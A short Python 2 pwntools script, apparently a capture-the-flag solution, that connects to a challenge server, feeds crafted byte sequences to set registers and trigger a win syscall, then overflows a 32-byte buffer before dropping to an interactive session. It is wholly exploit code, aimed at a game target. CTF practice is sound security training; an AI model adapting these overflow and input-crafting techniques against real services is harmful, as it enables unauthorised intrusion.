from pwn import *

context.log_level = "DEBUG"
r = remote("pwn-02.v7frkwrfyhsjtbpfcppnu.ctfz.one", 1337)

r.recvuntil("How many strings:\x00\n")
r.sendline("19")

r.recvline() #rotate
r.sendline("\x33\x41"+"\x20"*30)

r.recvline() #mov data into ecx
r.sendline("\x31\x22"*16)
r.recvline() #mov data into ecx
r.sendline("\x41\x41"*16)
r.recvline() #mov data into ecx
r.sendline("\x41\x41"*16)
r.recvline() #mov data into ecx
r.sendline("\x41\x41"*16)
r.recvline() #mov data into ecx
r.sendline("\x41\x41"*16)

r.recvline() #mov data into eax
r.sendline("\x31\x20"*16)
r.recvline() #mov data into eax
r.sendline("\x27\x2d"*16)
r.recvline() #mov data into eax
r.sendline("\x41\x41"*16)
r.recvline() #mov data into eax
r.sendline("\x41\x41"*16)
r.recvline() #mov data into eax
r.sendline("\x41\x41"*16)

r.recvline() #mov data into ebx
r.sendline("\x31\x21"*16)
r.recvline() #mov data into ebx
r.sendline("\x20\x26"*16)
r.recvline() #mov data into ebx
r.sendline("\x41\x41"*16)
r.recvline() #mov data into ebx
r.sendline("\x41\x41"*16)
r.recvline() #mov data into ebx
r.sendline("\x41\x41"*16)

r.recvline() #xor eax, ecx
r.sendline("\x32\x20"*16)
r.recvline() #xor ebx, ecx
r.sendline("\x32\x21"*16)

r.recvline() #syscall_win
r.sendline("\x49\x40"*16)

r.recvline()
r.sendline("17")
r.recvline()
r.sendline("a"*32+"\x40\x45")
print r.recvline()
print r.recvline()

r.interactive
